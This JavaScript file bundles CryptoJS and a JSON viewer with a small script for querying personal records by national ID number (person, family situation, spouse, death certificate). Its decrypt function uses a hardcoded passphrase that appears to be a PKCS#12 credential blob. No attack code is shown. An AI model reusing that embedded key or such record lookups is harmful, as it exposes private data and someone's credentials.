var CryptoJS=CryptoJS||function(u,p){var d={},l=d.lib={},s=function(){},t=l.Base={extend:function(a){s.prototype=this;var c=new s;a&&c.mixIn(a);c.hasOwnProperty("init")||(c.init=function(){c.$super.init.apply(this,arguments)});c.init.prototype=c;c.$super=this;return c},create:function(){var a=this.extend();a.init.apply(a,arguments);return a},init:function(){},mixIn:function(a){for(var c in a)a.hasOwnProperty(c)&&(this[c]=a[c]);a.hasOwnProperty("toString")&&(this.toString=a.toString)},clone:function(){return this.init.prototype.extend(this)}},
r=l.WordArray=t.extend({init:function(a,c){a=this.words=a||[];this.sigBytes=c!=p?c:4*a.length},toString:function(a){return(a||v).stringify(this)},concat:function(a){var c=this.words,e=a.words,j=this.sigBytes;a=a.sigBytes;this.clamp();if(j%4)for(var k=0;k<a;k++)c[j+k>>>2]|=(e[k>>>2]>>>24-8*(k%4)&255)<<24-8*((j+k)%4);else if(65535<e.length)for(k=0;k<a;k+=4)c[j+k>>>2]=e[k>>>2];else c.push.apply(c,e);this.sigBytes+=a;return this},clamp:function(){var a=this.words,c=this.sigBytes;a[c>>>2]&=4294967295<<
32-8*(c%4);a.length=u.ceil(c/4)},clone:function(){var a=t.clone.call(this);a.words=this.words.slice(0);return a},random:function(a){for(var c=[],e=0;e<a;e+=4)c.push(4294967296*u.random()|0);return new r.init(c,a)}}),w=d.enc={},v=w.Hex={stringify:function(a){var c=a.words;a=a.sigBytes;for(var e=[],j=0;j<a;j++){var k=c[j>>>2]>>>24-8*(j%4)&255;e.push((k>>>4).toString(16));e.push((k&15).toString(16))}return e.join("")},parse:function(a){for(var c=a.length,e=[],j=0;j<c;j+=2)e[j>>>3]|=parseInt(a.substr(j,
2),16)<<24-4*(j%8);return new r.init(e,c/2)}},b=w.Latin1={stringify:function(a){var c=a.words;a=a.sigBytes;for(var e=[],j=0;j<a;j++)e.push(String.fromCharCode(c[j>>>2]>>>24-8*(j%4)&255));return e.join("")},parse:function(a){for(var c=a.length,e=[],j=0;j<c;j++)e[j>>>2]|=(a.charCodeAt(j)&255)<<24-8*(j%4);return new r.init(e,c)}},x=w.Utf8={stringify:function(a){try{return decodeURIComponent(escape(b.stringify(a)))}catch(c){throw Error("Malformed UTF-8 data");}},parse:function(a){return b.parse(unescape(encodeURIComponent(a)))}},
q=l.BufferedBlockAlgorithm=t.extend({reset:function(){this._data=new r.init;this._nDataBytes=0},_append:function(a){"string"==typeof a&&(a=x.parse(a));this._data.concat(a);this._nDataBytes+=a.sigBytes},_process:function(a){var c=this._data,e=c.words,j=c.sigBytes,k=this.blockSize,b=j/(4*k),b=a?u.ceil(b):u.max((b|0)-this._minBufferSize,0);a=b*k;j=u.min(4*a,j);if(a){for(var q=0;q<a;q+=k)this._doProcessBlock(e,q);q=e.splice(0,a);c.sigBytes-=j}return new r.init(q,j)},clone:function(){var a=t.clone.call(this);
a._data=this._data.clone();return a},_minBufferSize:0});l.Hasher=q.extend({cfg:t.extend(),init:function(a){this.cfg=this.cfg.extend(a);this.reset()},reset:function(){q.reset.call(this);this._doReset()},update:function(a){this._append(a);this._process();return this},finalize:function(a){a&&this._append(a);return this._doFinalize()},blockSize:16,_createHelper:function(a){return function(b,e){return(new a.init(e)).finalize(b)}},_createHmacHelper:function(a){return function(b,e){return(new n.HMAC.init(a,
e)).finalize(b)}}});var n=d.algo={};return d}(Math);
(function(){var u=CryptoJS,p=u.lib.WordArray;u.enc.Base64={stringify:function(d){var l=d.words,p=d.sigBytes,t=this._map;d.clamp();d=[];for(var r=0;r<p;r+=3)for(var w=(l[r>>>2]>>>24-8*(r%4)&255)<<16|(l[r+1>>>2]>>>24-8*((r+1)%4)&255)<<8|l[r+2>>>2]>>>24-8*((r+2)%4)&255,v=0;4>v&&r+0.75*v<p;v++)d.push(t.charAt(w>>>6*(3-v)&63));if(l=t.charAt(64))for(;d.length%4;)d.push(l);return d.join("")},parse:function(d){var l=d.length,s=this._map,t=s.charAt(64);t&&(t=d.indexOf(t),-1!=t&&(l=t));for(var t=[],r=0,w=0;w<
l;w++)if(w%4){var v=s.indexOf(d.charAt(w-1))<<2*(w%4),b=s.indexOf(d.charAt(w))>>>6-2*(w%4);t[r>>>2]|=(v|b)<<24-8*(r%4);r++}return p.create(t,r)},_map:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="}})();
(function(u){function p(b,n,a,c,e,j,k){b=b+(n&a|~n&c)+e+k;return(b<<j|b>>>32-j)+n}function d(b,n,a,c,e,j,k){b=b+(n&c|a&~c)+e+k;return(b<<j|b>>>32-j)+n}function l(b,n,a,c,e,j,k){b=b+(n^a^c)+e+k;return(b<<j|b>>>32-j)+n}function s(b,n,a,c,e,j,k){b=b+(a^(n|~c))+e+k;return(b<<j|b>>>32-j)+n}for(var t=CryptoJS,r=t.lib,w=r.WordArray,v=r.Hasher,r=t.algo,b=[],x=0;64>x;x++)b[x]=4294967296*u.abs(u.sin(x+1))|0;r=r.MD5=v.extend({_doReset:function(){this._hash=new w.init([1732584193,4023233417,2562383102,271733878])},
_doProcessBlock:function(q,n){for(var a=0;16>a;a++){var c=n+a,e=q[c];q[c]=(e<<8|e>>>24)&16711935|(e<<24|e>>>8)&4278255360}var a=this._hash.words,c=q[n+0],e=q[n+1],j=q[n+2],k=q[n+3],z=q[n+4],r=q[n+5],t=q[n+6],w=q[n+7],v=q[n+8],A=q[n+9],B=q[n+10],C=q[n+11],u=q[n+12],D=q[n+13],E=q[n+14],x=q[n+15],f=a[0],m=a[1],g=a[2],h=a[3],f=p(f,m,g,h,c,7,b[0]),h=p(h,f,m,g,e,12,b[1]),g=p(g,h,f,m,j,17,b[2]),m=p(m,g,h,f,k,22,b[3]),f=p(f,m,g,h,z,7,b[4]),h=p(h,f,m,g,r,12,b[5]),g=p(g,h,f,m,t,17,b[6]),m=p(m,g,h,f,w,22,b[7]),
f=p(f,m,g,h,v,7,b[8]),h=p(h,f,m,g,A,12,b[9]),g=p(g,h,f,m,B,17,b[10]),m=p(m,g,h,f,C,22,b[11]),f=p(f,m,g,h,u,7,b[12]),h=p(h,f,m,g,D,12,b[13]),g=p(g,h,f,m,E,17,b[14]),m=p(m,g,h,f,x,22,b[15]),f=d(f,m,g,h,e,5,b[16]),h=d(h,f,m,g,t,9,b[17]),g=d(g,h,f,m,C,14,b[18]),m=d(m,g,h,f,c,20,b[19]),f=d(f,m,g,h,r,5,b[20]),h=d(h,f,m,g,B,9,b[21]),g=d(g,h,f,m,x,14,b[22]),m=d(m,g,h,f,z,20,b[23]),f=d(f,m,g,h,A,5,b[24]),h=d(h,f,m,g,E,9,b[25]),g=d(g,h,f,m,k,14,b[26]),m=d(m,g,h,f,v,20,b[27]),f=d(f,m,g,h,D,5,b[28]),h=d(h,f,
m,g,j,9,b[29]),g=d(g,h,f,m,w,14,b[30]),m=d(m,g,h,f,u,20,b[31]),f=l(f,m,g,h,r,4,b[32]),h=l(h,f,m,g,v,11,b[33]),g=l(g,h,f,m,C,16,b[34]),m=l(m,g,h,f,E,23,b[35]),f=l(f,m,g,h,e,4,b[36]),h=l(h,f,m,g,z,11,b[37]),g=l(g,h,f,m,w,16,b[38]),m=l(m,g,h,f,B,23,b[39]),f=l(f,m,g,h,D,4,b[40]),h=l(h,f,m,g,c,11,b[41]),g=l(g,h,f,m,k,16,b[42]),m=l(m,g,h,f,t,23,b[43]),f=l(f,m,g,h,A,4,b[44]),h=l(h,f,m,g,u,11,b[45]),g=l(g,h,f,m,x,16,b[46]),m=l(m,g,h,f,j,23,b[47]),f=s(f,m,g,h,c,6,b[48]),h=s(h,f,m,g,w,10,b[49]),g=s(g,h,f,m,
E,15,b[50]),m=s(m,g,h,f,r,21,b[51]),f=s(f,m,g,h,u,6,b[52]),h=s(h,f,m,g,k,10,b[53]),g=s(g,h,f,m,B,15,b[54]),m=s(m,g,h,f,e,21,b[55]),f=s(f,m,g,h,v,6,b[56]),h=s(h,f,m,g,x,10,b[57]),g=s(g,h,f,m,t,15,b[58]),m=s(m,g,h,f,D,21,b[59]),f=s(f,m,g,h,z,6,b[60]),h=s(h,f,m,g,C,10,b[61]),g=s(g,h,f,m,j,15,b[62]),m=s(m,g,h,f,A,21,b[63]);a[0]=a[0]+f|0;a[1]=a[1]+m|0;a[2]=a[2]+g|0;a[3]=a[3]+h|0},_doFinalize:function(){var b=this._data,n=b.words,a=8*this._nDataBytes,c=8*b.sigBytes;n[c>>>5]|=128<<24-c % 32;var e=u.floor(a/
4294967296);n[(c+64>>>9<<4)+15]=(e<<8|e>>>24)&16711935|(e<<24|e>>>8)&4278255360;n[(c+64>>>9<<4)+14]=(a<<8|a>>>24)&16711935|(a<<24|a>>>8)&4278255360;b.sigBytes=4*(n.length+1);this._process();b=this._hash;n=b.words;for(a=0;4>a;a++)c=n[a],n[a]=(c<<8|c>>>24)&16711935|(c<<24|c>>>8)&4278255360;return b},clone:function(){var b=v.clone.call(this);b._hash=this._hash.clone();return b}});t.MD5=v._createHelper(r);t.HmacMD5=v._createHmacHelper(r)})(Math);
(function(){var u=CryptoJS,p=u.lib,d=p.Base,l=p.WordArray,p=u.algo,s=p.EvpKDF=d.extend({cfg:d.extend({keySize:4,hasher:p.MD5,iterations:1}),init:function(d){this.cfg=this.cfg.extend(d)},compute:function(d,r){for(var p=this.cfg,s=p.hasher.create(),b=l.create(),u=b.words,q=p.keySize,p=p.iterations;u.length<q;){n&&s.update(n);var n=s.update(d).finalize(r);s.reset();for(var a=1;a<p;a++)n=s.finalize(n),s.reset();b.concat(n)}b.sigBytes=4*q;return b}});u.EvpKDF=function(d,l,p){return s.create(p).compute(d,
l)}})();
CryptoJS.lib.Cipher||function(u){var p=CryptoJS,d=p.lib,l=d.Base,s=d.WordArray,t=d.BufferedBlockAlgorithm,r=p.enc.Base64,w=p.algo.EvpKDF,v=d.Cipher=t.extend({cfg:l.extend(),createEncryptor:function(e,a){return this.create(this._ENC_XFORM_MODE,e,a)},createDecryptor:function(e,a){return this.create(this._DEC_XFORM_MODE,e,a)},init:function(e,a,b){this.cfg=this.cfg.extend(b);this._xformMode=e;this._key=a;this.reset()},reset:function(){t.reset.call(this);this._doReset()},process:function(e){this._append(e);return this._process()},
finalize:function(e){e&&this._append(e);return this._doFinalize()},keySize:4,ivSize:4,_ENC_XFORM_MODE:1,_DEC_XFORM_MODE:2,_createHelper:function(e){return{encrypt:function(b,k,d){return("string"==typeof k?c:a).encrypt(e,b,k,d)},decrypt:function(b,k,d){return("string"==typeof k?c:a).decrypt(e,b,k,d)}}}});d.StreamCipher=v.extend({_doFinalize:function(){return this._process(!0)},blockSize:1});var b=p.mode={},x=function(e,a,b){var c=this._iv;c?this._iv=u:c=this._prevBlock;for(var d=0;d<b;d++)e[a+d]^=
c[d]},q=(d.BlockCipherMode=l.extend({createEncryptor:function(e,a){return this.Encryptor.create(e,a)},createDecryptor:function(e,a){return this.Decryptor.create(e,a)},init:function(e,a){this._cipher=e;this._iv=a}})).extend();q.Encryptor=q.extend({processBlock:function(e,a){var b=this._cipher,c=b.blockSize;x.call(this,e,a,c);b.encryptBlock(e,a);this._prevBlock=e.slice(a,a+c)}});q.Decryptor=q.extend({processBlock:function(e,a){var b=this._cipher,c=b.blockSize,d=e.slice(a,a+c);b.decryptBlock(e,a);x.call(this,
e,a,c);this._prevBlock=d}});b=b.CBC=q;q=(p.pad={}).Pkcs7={pad:function(a,b){for(var c=4*b,c=c-a.sigBytes%c,d=c<<24|c<<16|c<<8|c,l=[],n=0;n<c;n+=4)l.push(d);c=s.create(l,c);a.concat(c)},unpad:function(a){a.sigBytes-=a.words[a.sigBytes-1>>>2]&255}};d.BlockCipher=v.extend({cfg:v.cfg.extend({mode:b,padding:q}),reset:function(){v.reset.call(this);var a=this.cfg,b=a.iv,a=a.mode;if(this._xformMode==this._ENC_XFORM_MODE)var c=a.createEncryptor;else c=a.createDecryptor,this._minBufferSize=1;this._mode=c.call(a,
this,b&&b.words)},_doProcessBlock:function(a,b){this._mode.processBlock(a,b)},_doFinalize:function(){var a=this.cfg.padding;if(this._xformMode==this._ENC_XFORM_MODE){a.pad(this._data,this.blockSize);var b=this._process(!0)}else b=this._process(!0),a.unpad(b);return b},blockSize:4});var n=d.CipherParams=l.extend({init:function(a){this.mixIn(a)},toString:function(a){return(a||this.formatter).stringify(this)}}),b=(p.format={}).OpenSSL={stringify:function(a){var b=a.ciphertext;a=a.salt;return(a?s.create([1398893684,
1701076831]).concat(a).concat(b):b).toString(r)},parse:function(a){a=r.parse(a);var b=a.words;if(1398893684==b[0]&&1701076831==b[1]){var c=s.create(b.slice(2,4));b.splice(0,4);a.sigBytes-=16}return n.create({ciphertext:a,salt:c})}},a=d.SerializableCipher=l.extend({cfg:l.extend({format:b}),encrypt:function(a,b,c,d){d=this.cfg.extend(d);var l=a.createEncryptor(c,d);b=l.finalize(b);l=l.cfg;return n.create({ciphertext:b,key:c,iv:l.iv,algorithm:a,mode:l.mode,padding:l.padding,blockSize:a.blockSize,formatter:d.format})},
decrypt:function(a,b,c,d){d=this.cfg.extend(d);b=this._parse(b,d.format);return a.createDecryptor(c,d).finalize(b.ciphertext)},_parse:function(a,b){return"string"==typeof a?b.parse(a,this):a}}),p=(p.kdf={}).OpenSSL={execute:function(a,b,c,d){d||(d=s.random(8));a=w.create({keySize:b+c}).compute(a,d);c=s.create(a.words.slice(b),4*c);a.sigBytes=4*b;return n.create({key:a,iv:c,salt:d})}},c=d.PasswordBasedCipher=a.extend({cfg:a.cfg.extend({kdf:p}),encrypt:function(b,c,d,l){l=this.cfg.extend(l);d=l.kdf.execute(d,
b.keySize,b.ivSize);l.iv=d.iv;b=a.encrypt.call(this,b,c,d.key,l);b.mixIn(d);return b},decrypt:function(b,c,d,l){l=this.cfg.extend(l);c=this._parse(c,l.format);d=l.kdf.execute(d,b.keySize,b.ivSize,c.salt);l.iv=d.iv;return a.decrypt.call(this,b,c,d.key,l)}})}();
(function(){for(var u=CryptoJS,p=u.lib.BlockCipher,d=u.algo,l=[],s=[],t=[],r=[],w=[],v=[],b=[],x=[],q=[],n=[],a=[],c=0;256>c;c++)a[c]=128>c?c<<1:c<<1^283;for(var e=0,j=0,c=0;256>c;c++){var k=j^j<<1^j<<2^j<<3^j<<4,k=k>>>8^k&255^99;l[e]=k;s[k]=e;var z=a[e],F=a[z],G=a[F],y=257*a[k]^16843008*k;t[e]=y<<24|y>>>8;r[e]=y<<16|y>>>16;w[e]=y<<8|y>>>24;v[e]=y;y=16843009*G^65537*F^257*z^16843008*e;b[k]=y<<24|y>>>8;x[k]=y<<16|y>>>16;q[k]=y<<8|y>>>24;n[k]=y;e?(e=z^a[a[a[G^z]]],j^=a[a[j]]):e=j=1}var H=[0,1,2,4,8,
16,32,64,128,27,54],d=d.AES=p.extend({_doReset:function(){for(var a=this._key,c=a.words,d=a.sigBytes/4,a=4*((this._nRounds=d+6)+1),e=this._keySchedule=[],j=0;j<a;j++)if(j<d)e[j]=c[j];else{var k=e[j-1];j%d?6<d&&4==j%d&&(k=l[k>>>24]<<24|l[k>>>16&255]<<16|l[k>>>8&255]<<8|l[k&255]):(k=k<<8|k>>>24,k=l[k>>>24]<<24|l[k>>>16&255]<<16|l[k>>>8&255]<<8|l[k&255],k^=H[j/d|0]<<24);e[j]=e[j-d]^k}c=this._invKeySchedule=[];for(d=0;d<a;d++)j=a-d,k=d%4?e[j]:e[j-4],c[d]=4>d||4>=j?k:b[l[k>>>24]]^x[l[k>>>16&255]]^q[l[k>>>
8&255]]^n[l[k&255]]},encryptBlock:function(a,b){this._doCryptBlock(a,b,this._keySchedule,t,r,w,v,l)},decryptBlock:function(a,c){var d=a[c+1];a[c+1]=a[c+3];a[c+3]=d;this._doCryptBlock(a,c,this._invKeySchedule,b,x,q,n,s);d=a[c+1];a[c+1]=a[c+3];a[c+3]=d},_doCryptBlock:function(a,b,c,d,e,j,l,f){for(var m=this._nRounds,g=a[b]^c[0],h=a[b+1]^c[1],k=a[b+2]^c[2],n=a[b+3]^c[3],p=4,r=1;r<m;r++)var q=d[g>>>24]^e[h>>>16&255]^j[k>>>8&255]^l[n&255]^c[p++],s=d[h>>>24]^e[k>>>16&255]^j[n>>>8&255]^l[g&255]^c[p++],t=
d[k>>>24]^e[n>>>16&255]^j[g>>>8&255]^l[h&255]^c[p++],n=d[n>>>24]^e[g>>>16&255]^j[h>>>8&255]^l[k&255]^c[p++],g=q,h=s,k=t;q=(f[g>>>24]<<24|f[h>>>16&255]<<16|f[k>>>8&255]<<8|f[n&255])^c[p++];s=(f[h>>>24]<<24|f[k>>>16&255]<<16|f[n>>>8&255]<<8|f[g&255])^c[p++];t=(f[k>>>24]<<24|f[n>>>16&255]<<16|f[g>>>8&255]<<8|f[h&255])^c[p++];n=(f[n>>>24]<<24|f[g>>>16&255]<<16|f[h>>>8&255]<<8|f[k&255])^c[p++];a[b]=q;a[b+1]=s;a[b+2]=t;a[b+3]=n},keySize:8});u.AES=p._createHelper(d)})();

var JSONViewer=function(e){var t={}.toString,n=t.call(new Date);function a(){this._dom_container=e.createElement("pre"),this._dom_container.classList.add("json-viewer")}function i(t,n){var a=e.createElement("span"),i=typeof t,l=""+t;return"string"===i?l='"'+t+'"':null===t?i="null":n&&(i="date",l=t.toLocaleString()),a.className="type-"+i,a.textContent=l,a}function l(t){var n=e.createElement("span");return n.className="items-ph hide",n.innerHTML=function(e){return e+" "+(e>1||0===e?"items":"item")}(t),n}function r(t){var n=e.createElement("a");return n.classList.add("list-link"),n.href="javascript:void(0)",n.innerHTML=t||"",n}return a.prototype.showJSON=function(a,s,d){var o="number"==typeof s?s:-1,c="number"==typeof d?d:-1;this._dom_container.innerHTML="",function a(s,d,o,c,p){var h=t.call(d)===n;var u=!h&&"object"==typeof d&&null!==d&&"toJSON"in d?d.toJSON():d;if("object"!=typeof u||null===u||h)s.appendChild(i(d,h));else{var f=o>=0&&p>=o,g=c>=0&&p>=c,v=Array.isArray(u),m=v?u:Object.keys(u);if(0===p){var y=l(m.length),L=r(v?"[":"{");m.length?(L.addEventListener("click",function(){f||(L.classList.toggle("collapsed"),y.classList.toggle("hide"),s.querySelector("ul").classList.toggle("hide"))}),g&&(L.classList.add("collapsed"),y.classList.remove("hide"))):L.classList.add("empty"),L.appendChild(y),s.appendChild(L)}if(m.length&&!f){var C=m.length-1,N=e.createElement("ul");N.setAttribute("data-level",p),N.classList.add("type-"+(v?"array":"object")),m.forEach(function(t,n){var s=v?t:d[t],h=e.createElement("li");if("object"==typeof s)if(!s||s instanceof Date)h.appendChild(e.createTextNode(v?"":t+": ")),h.appendChild(i(s||null,!0));else{var u=Array.isArray(s),f=u?s.length:Object.keys(s).length;if(f){var g=("string"==typeof t?t+": ":"")+(u?"[":"{"),m=r(g),y=l(f);o>=0&&p+1>=o?h.appendChild(e.createTextNode(g)):(m.appendChild(y),h.appendChild(m)),a(h,s,o,c,p+1),h.appendChild(e.createTextNode(u?"]":"}"));var L=h.querySelector("ul"),T=function(){m.classList.toggle("collapsed"),y.classList.toggle("hide"),L.classList.toggle("hide")};m.addEventListener("click",T),c>=0&&p+1>=c&&T()}else h.appendChild(e.createTextNode(t+": "+(u?"[]":"{}")))}else v||h.appendChild(e.createTextNode(t+": ")),a(h,s,o,c,p+1);n<C&&h.appendChild(e.createTextNode(",")),N.appendChild(h)},this),s.appendChild(N)}else if(m.length&&f){var T=l(m.length);T.classList.remove("hide"),s.appendChild(T)}if(0===p){if(!m.length){var T=l(0);T.classList.remove("hide"),s.appendChild(T)}s.appendChild(e.createTextNode(v?"]":"}")),g&&s.querySelector("ul").classList.add("hide")}}}(this._dom_container,a,o,c,0)},a.prototype.getContainer=function(){return this._dom_container},a}(document);
var jsonViewer = new JSONViewer();
var token = "",
urlx = ["person-by-cin","situation-family-by-cin","spouse-by-cin","death-certificate-by-cin"];
function xdecrypt(x){
    return CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(x,"-----BEGIN PUBLIC KEY-----\n3082 0a21 0201 0330 8209 da06 092a 8648\n86f7 0d01 0701 a082 09cb 0482 09c7 3082\n09c3 3082 056f 0609 2a86 4886 f70d 0107\n01a0 8205 6004 8205 5c30 8205 5830 8205\n5406 0b2a 8648 86f7 0d01 0c0a 0102 a082\n04fb 3082 04f7 3029 060a 2a86 4886 f70d\n010c 0103 301b 0414 90bd d9a2 1292 979e\n7db1 07ea 0eaa 9861 34b6 635a 0203 00c3\n5004 8204 c856 b91d 66d5 5c69 9693 b473\na354 6d02 a6c3 2cad c6c9 8451 45fc e676\n4607 9cc5 75bc 6199 c2c5 0f3d 2f4c fdb0\nbd5c e767 6f41 a9f3 1479 9acb 6314 03c8\n4fb2 b7dd dd65 b275 5b27 1f11 f34e 51dc\n4a9c 690d e79c 7d92 0546 8037 1836 9961\n68fc 1882 3bf0 548e c8aa c082 3704 2680\nde46 ef79 166b 08a0 688c c777 ad6c cfbb\n3c2f 3599 00e0 d46f 98a0 fc81 8905 9080\n6a56 e512 ccd6 121c 2144 a057 2c68 5059\n847d 24f6 cda4 4923 8a7a 47a2 2deb 9f90\n060a 41af 8678 84e4 5693 5296 e5ff 917c\nefd2 adfd 60f0 55f1 3b76 2fb9 6f5f abaa\nbc80 0bed d3e8 cc3b 6d05 a459 f48b 76ce\nb2ad 1491 e609 e8ae 3a8e 5e7b d261 2cd1\n591c 4ae5 f69e 287b 88a6 9c35 95ac 4ef0\n6141 7eec 1ade b9b2 e009 a211 7d1a c2c6\nc546 461b b055 38b2 50ec 9640 cb03 df7d\n3d4b cf7d 6f0e 20d6 fbcb e76b 2bb8 7cb6\nea4f 6449 7a6b da0f e475 352b e22f f2e9\n4885 79f7 bb01 90cd b45d 12aa 1b03 a5c3\n282c c92a 72e5 2663 bc5e 9431 62c7 2fac\n999c 734b fe45 125a 3747 88aa 5ff5 2df9\ncc64 0871 b0ec 436d 2b16 ff60 4e39 4853\na978 d7b9 cc9a 3e7f 62b7 c61d 79d7 d801\n5d90 cd27 2e10 e1fa bbb8 4e3f e8b1 5e4d\n3290 eb6b 0e2c 0709 9d16 ea77 fd1e cae6\n018c b477 962a 9e95 4b29 ce7f 58fa 04b2\n7764 d7e5 7c6f 24d2 02be a067 b6cf ae75\n9695 7664 55db be8c 3852 5a03 fbd2 eeaa\n445f e08d e912 8d9e 9264 f557 c5e7 2075\n12b3 8a4b 01d0 bea2 a21a 2575 fd9a 9d97\n2a2c d22f da03 8ce8 7874 ca16 58e3 a529\n828a 4f9a 6320 b92a 73a9 5288 e970 be28\n08cd 23ae e087 6132 00f5 dc5f d5fe 71ee\n1404 080c 31ca af86 8616 64b5 acb5 196f\n731b 02ea 8337 9d0f 552e 7159 602e 7d2c\n0d8f 004d 610d e7ac 304a 2aad 811b 33df\n591f 487d 46c0 0773 0d74 78ff d2e3 768f\n462a e0b9 938e 3617 987b a117 aedc 68c4\n9faf 25c0 34b3 5e41 b58c 5d96 3c2e 4715\n3c6c 9813 46e8 4da9 36f3 28c1 d3d4 fa86\n1d08 c07f 381a 4b78 ca47 ae3a cbe4 0520\n1cb6 1c0a 9176 d0ef fc73 83a5 17d4 f33a\nfad5 c84b 394b 5f46 52d8 6a85 63d9 dd02\ned44 0624 6fee 951e 4fd5 9cae dd81 2036\n76d2 f7e6 1042 9b4f 1da6 8cd8 67a0 6778\n0c4d 913b 7603 28e6 8076 e413 6fcf 2a2d\n121e 8126 02d0 e882 ffed 0612 9906 00c7\ncc02 4be6 b845 b3c9 4e84 173d 2a4f 503d\n1c50 d7ab c443 b3d1 d8dc c82b c18e 0db6\neecd cdc2 c310 1492 7adb dac2 ec45 cca9\ne47d 5953 4609 6606 cc63 d858 3090 202b\n51cd 5aa3 b602 1d33 b670 246f 0f26 d80e\n1ce5 0abf 7d10 b6d5 c7c3 e27c c36d 106a\n016a 2838 2cb0 3225 2757 c794 c350 20ab\n2ede 36c2 1029 3238 b703 84d8 ebb7 7d00\na395 f905 4354 d400 2b20 539f 1825 0a73\n535c 5132 69da e476 1e2d 12ad 1ddf c11f\n7602 bf47 a51e d771 9fcf e829 73ef cc83\na7f2 026a 8fb4 63d3 4615 9f6d 06c0 2c4f\n4882 a15d bfb2 9cdd 36ea fcce 6b10 a981\n4ce5 2858 98f3 5783 7d87 7744 b00c 4a55\n6e05 efd4 4495 22f5 9af1 80df 37eb cc69\n562e 76bd 11e1 9754 4471 9f49 d41d f060\n6127 0c78 c876 1501 8a9c 193a ff2e b7b6\n4c54 ffa7 81ff 99ab d1c6 8d12 6160 c415\nf48f d77e dc68 7f69 d3a8 3800 0f80 d348\nc77f a12a 6c04 9f81 925f 7e9c bfe0 9cbd\n40b6 88e9 2573 3577 a434 fcf3 15cb d93e\n444f 03d9 cdbd 2d80 69f4 b59f 91f1 4781\n7f32 071c 6d96 48bb 61b8 60b5 b62d 335d\naf41 785a 5779 9095 9d63 66f9 981a d5b6\n64bf 0042 fab6 7d78 9fd0 78be 7dc0 5cca\n4644 6ec7 4cc9 5316 2c67 9735 851d 9538\n873d b713 fc3b 15e7 b5af 765e e783 025d\n235f e7e8 4efa 4b59 e410 31cf d831 4630\n2106 092a 8648 86f7 0d01 0914 3114 1e12\n0066 006d 0069 006e 0069 0073 0074 0072\n0079 3021 0609 2a86 4886 f70d 0109 1531\n1404 1254 696d 6520 3135 3838 3737 3332\n3333 3031 3630 8204 4c06 092a 8648 86f7\n0d01 0706 a082 043d 3082 0439 0201 0030\n8204 3206 092a 8648 86f7 0d01 0701 3029\n060a 2a86 4886 f70d 010c 0106 301b 0414\n5c42 6f64 7988 e2c2 c952 8adc ae20 bcc8\n4c3b d271 0203 00c3 5080 8203 f8ce 45cc\n9650 0bda acda d45d 61d8 cab0 8537 a33f\nfa38 1af1 5074 8ad0 41ce e4ab 13d6 eabe\n8132 8894 d6ea b1e5 53f6 4d96 a67a e60f\n8d38 225e 1c66 85b2 c44e aa15 ce80 081d\n1f98 595f 7a14 f7c9 8330 c282 33f1 ab03\nb354 1412 718f 912b 0675 9922 576a 5802\n2b79 3637 d59d f5c7 c111 10fe 30bc 26e3\n720f 18f4 0512 4784 bebe 7d7c f61d 0ae2\n0597 6941 96f4 daf9 ca7c e702 d1f7 6fb9\n5960 51c2 4686 3932 779d 031c 9aac c5e1\n40ff 8d21 abfa ae57 ddf7 fb70 6452 318e\n1858 24e1 fba9 b48b f61f 4ea5 ceeb f8c4\nacb9 e882 9015 b662 d5c4 a9e5 b102 0820\n91e2 5cfe 0c7f 4dd5 d3c2 2524 f174 6adc\n1040 c5bc d038 a5e9 f42d 7576 55e8 b08f\n0235 120a edf8 92db a347 e0d4 7176 c1e8\n476a 7cf1 cf56 9236 775d 164f d493 cf99\n31d4 9dcc 8635 33da 8b88 160a 7656 f26e\nb6de 3430 eec3 a631 3fc4 7ea9 88d9 d66e\n6746 5e6e f256 1022 ce41 5545 eb81 6c26\n7ce7 9e0f 52b3 f2b5 17e6 e40a 8f17 c126\n6f1b a3ec 6128 f150 825c 2584 90ca 3c34\ncf2c ad62 3a9b f747 0ed8 c815 990f 1604\nb855 124b dadd 64e6 b95d aa93 dda0 7f27\n3262 2201 a856 6029 db78 277b c62b 939d\nd400 9efa 92a1 a798 0f3b 820c 1804 50f9\nc55d 4f7e 105e ad3b 565b ccbc 23d3 234d\na074 e5f9 9182 424c 8d70 1295 6b49 5592\ne3a6 5297 a0e1 594e 4fc4 1e91 e276 4f22\n1392 8990 602f 8772 5684 771d 4d26 f90c\n1c51 3219 1777 e436 94d4 d847 9d47 c7e3\n26d3 9d51 eb2e e2c2 22be 2a6e 2177 1f1c\nbb63 e22c 6aaf 4fb2 0934 d068 9a7f 6aff\ndac7 9a87 c253 74f6 412a d1dc 490d 5615\n88bd 0f5d 5515 ca30 0b45 0f4f 9782 10fa\n73cb eb9c 992c 9cef d1c0 2ded a3c4 a0e6\n47a8 2900 9043 e53e 578a 8915 800b 9e78\nbe6a e575 f391 541c 36d3 35e8 91fa 1e2b\nd05a 3498 5c76 e9b5 48b3 bb40 ee4d b899\nb173 0ad0 0861 6057 2ceb 1f8c ab38 6446\n2d6d aa7b 9aaf 9a07 2931 4dcf fa8c bf8d\n1515 d97f b6c4 197e 1651 7d91 c953 da46\n8ff6 e035 3e8b 486a 9be2 e855 28ed 1da2\n5a10 5943 a601 308b 4dbc 8641 60c1 dd5f\n55aa 43c5 821d 5537 7bcc dde4 ca83 4d18\nd319 9ec4 8b7e 5760 e081 fba3 7f13 0c69\nb682 7a28 3d9a 757b 8c70 6097 872d 27a4\n36c8 4f99 7122 12e6 c001 286d 69fc 457e\n4db3 2127 bb31 9e78 735e 2a3a be6e 1960\ndb3e 00d7 1415 b8d0 4fed 67d5 4f21 ad31\n8525 90fa 96ba 9d22 1fd4 2bd4 5353 b8c0\n851e dc6d c300 f049 83cf 5832 f519 3056\n408e d3e0 1b9d a5bc a70f 42ba 5cb8 c27d\n5484 a667 d51b 9ffe 8526 fc07 d8bf 96ff\n6e8e ab57 fd66 6de2 4c35 11d4 6fc0 35ed\n81fa 8aaf ab4a 6732 b4a0 7180 d8fb caa8\n258e 319c 8d91 8457 121a cb5d 14aa ac7e\n611c 3d5e d387 c28e 2b9d c5c4 7a38 6156\nc384 ecac da00 f40a f839 ef1d 6c06 8865\nf6b4 6e64 f626 bd74 51f1 f018 d996 515a\nb689 0140 45b2 1875 1225 0f4a f6f9 9148\n1987 6b6d 7f4d 337d a583 f1b4 d1e7 3f00\n4923 fd53 8bec 36c5 b58d ed43 b0f3 609d\n11a9 85db 0230 3e30 2130 0906 052b 0e03\n021a 0500 0414 f334 e09d fc7d deb7 05fc\n17ca c12d cbce 1ecb 40d2 0414 5c9a 9bb3\n5775 210d 2b86 f3d5 979e 876c 5b13 